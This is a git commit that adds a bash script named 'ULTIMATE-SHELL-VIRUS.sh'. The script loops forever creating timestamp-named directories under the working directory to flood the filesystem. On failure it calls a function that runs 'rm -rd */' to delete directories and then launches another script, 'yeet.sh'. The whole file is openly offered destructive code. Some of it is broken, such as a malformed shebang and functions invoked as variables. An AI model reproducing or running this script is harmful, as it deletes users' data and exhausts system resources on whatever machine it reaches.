012b83c590e291ff860c93826c9476789389a41e
J-Tech-Foundation <52475982+J-Tech-Foundation@users.noreply.github.com>
2019-09-12 13:29:55 -0400

    Create ULTIMATE-SHELL-VIRUS.sh

---
+++ ULTIMATE-SHELL-VIRUS.sh
@@ -0,0 +1,38 @@
+#!bin/bash
+timeout() {
+
+    time=$1
+
+    # start the command in a subshell to avoid problem with pipes
+    # (spawn accepts one command)
+    command="/bin/sh -c \"$2\""
+
+    expect -c "set echo \"-noecho\"; set timeout $time; spawn -noecho $command; expect timeout { exit 1 } eof { exit 0 }"    
+
+    if [ $? = 1 ] ; then
+        echo "Timeout after ${time} seconds"
+    fi
+
+}
+reset="\e[m"
+dark_blue="\e[38;5;21m"
+killfiles(){
+  rm -rd */ #for more lag :D
+  echo -e "$dark_blue"
+  $timeout 10 "bash yeet.sh"
+}
+set +E
+while true
+do
+  x=$(date +%S-%N)
+  if [ -d $HOME/$x ]
+  then
+    cd $x
+    mkdir $x || $killfiles
+    cd ../
+    echo -e "$dark_blue $HOME/$x/$x/ $reset"
+  fi
+  mkdir $x || $killfiles
+  echo -e "$dark_blue $HOME/$x/ $reset"
+  
+done
